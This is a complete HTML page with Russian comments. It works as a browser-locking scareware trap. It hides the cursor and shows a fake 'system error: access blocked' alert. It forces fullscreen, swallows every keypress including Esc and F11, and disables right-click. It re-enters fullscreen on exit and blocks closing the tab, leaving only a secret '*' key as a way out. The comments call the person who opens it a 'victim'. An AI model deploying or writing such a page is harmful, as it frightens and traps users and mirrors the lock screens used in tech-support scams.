<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>‎</title> <!-- Пустой заголовок -->
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; cursor: none; }
    </style>
</head>
<body>
<script>
    const docEl = document.documentElement;
    let isChaosActive = true;

    // Функция возврата в Fullscreen + спам алертами
    const enterFS = async () => {
        if (!isChaosActive) return;
        
        // Показываем алерт ПЕРЕД попыткой войти в FS (это сбивает фокус браузера)
        alert("ОШИБКА СИСТЕМЫ: Доступ заблокирован");
        
        try {
            if (docEl.requestFullscreen) await docEl.requestFullscreen();
            else if (docEl.webkitRequestFullscreen) await docEl.webkitRequestFullscreen();
        } catch (e) {
            // Если браузер блокирует авто-вход, ждем следующего клика
        }
    };

    const blockEverything = (e) => {
        if (!isChaosActive) return;

        // СЕКРЕТНЫЙ ВЫХОД: Клавиша "*"
        if (e.key === "*") {
            isChaosActive = false;
            document.body.style.cursor = "default";
            if (document.exitFullscreen) document.exitFullscreen();
            return;
        }

        // Блокируем абсолютно все клавиши
        e.preventDefault();
        e.stopPropagation();

        // Если нажаты Esc, F11 или любая другая клавиша — вызываем "хаос"
        setTimeout(enterFS, 50); 
    };

    // Слушатели событий
    window.addEventListener('keydown', blockEverything, true);
    window.addEventListener('keyup', blockEverything, true);
    
    // Запрет контекстного меню (правой кнопки)
    window.addEventListener('contextmenu', (e) => e.preventDefault());

    // Слежка за выходом из Fullscreen
    document.addEventListener('fullscreenchange', () => {
        if (isChaosActive && !document.fullscreenElement) {
            enterFS();
        }
    });

    // Ловушка на закрытие вкладки (показывает системное окно)
    window.onbeforeunload = () => {
        if (isChaosActive) return "Вы уверены?";
    };

    // Активация ловушки первым кликом (жертва должна кликнуть 1 раз)
    document.addEventListener('click', () => {
        if (isChaosActive) enterFS();
    }, { once: false });

</script>
</body>
</html>
